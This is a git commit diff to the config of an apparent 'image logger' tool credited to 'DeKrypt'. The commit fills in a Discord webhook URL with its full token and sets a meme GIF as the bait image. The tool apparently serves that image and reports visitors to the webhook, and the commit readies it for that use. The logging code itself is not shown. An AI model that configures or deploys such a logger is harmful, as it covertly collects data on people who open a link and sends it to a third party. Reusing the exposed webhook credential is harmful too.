684d9efc8afd75e10e89ee562c2011a37d155aab
Scher55 <147992066+Scher55@users.noreply.github.com>
2025-03-01 23:31:30 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1345493589932642457/KjGGL_HXwzBBSO1o9gyMzOlvKRbGME5Zud2m-8AGBX79V26iNMbdRF-Oim-a4AFK0NB_",
+    "image": "https://tenor.com/view/beggar-mendiant-emoji-meme-gif-14766354842854086359", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
